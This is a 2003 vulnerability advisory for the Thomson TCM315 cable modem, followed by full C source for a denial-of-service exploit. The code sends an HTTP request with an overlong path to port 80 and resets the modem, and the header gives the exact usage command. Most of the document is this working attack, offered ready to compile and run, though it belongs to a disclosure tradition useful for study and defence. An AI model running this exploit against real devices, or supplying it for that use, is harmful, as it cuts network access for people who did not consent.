/*
ADVISORY - Thomson Cablemodem TCM315 Denial of Service

Shell security group (2003) http://www.shellsec.net

November 10 of 2003

Tested against: TCM315 MP
Software Version: ST31.04.00
Software Model: A801
Bootloader: 2.1.4c
Impact: Users with access to the network can remotely shutdown internet 
connection.

Discovered by: aT4r Andres[at]shellsec.net
Vendor: contacted (no answer)
Fix: no yet

usage: just, thdos.exe 192.168.100.1

*/

#include <stdio.h>
#include <winsock2.h>

void main(int argc,char *argv[]) {
char evil[150],buffer[1000];
struct sockaddr_in shellsec;
int fd;
WSADATA ws;

WSAStartup( MAKEWORD(1,1), &( ws) );

shellsec.sin_family = AF_INET;
shellsec.sin_port = htons(80);
shellsec.sin_addr.s_addr = inet_addr(argv[1]);

memset(evil,'\0',sizeof(evil));
memset(evil,'A',100);
sprintf(buffer,"GET /%s HTTP/1.1\r\n\r\n\r\n",evil);

fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if (connect(fd,( struct sockaddr *)&shellsec,sizeof(shellsec)) != -1) {
send(fd,buffer,strlen(buffer),0);
printf("done. Thomson Cablemodem reset!\n");
sleep(100);
}
else printf("Unable to connect to CM.\n");
}
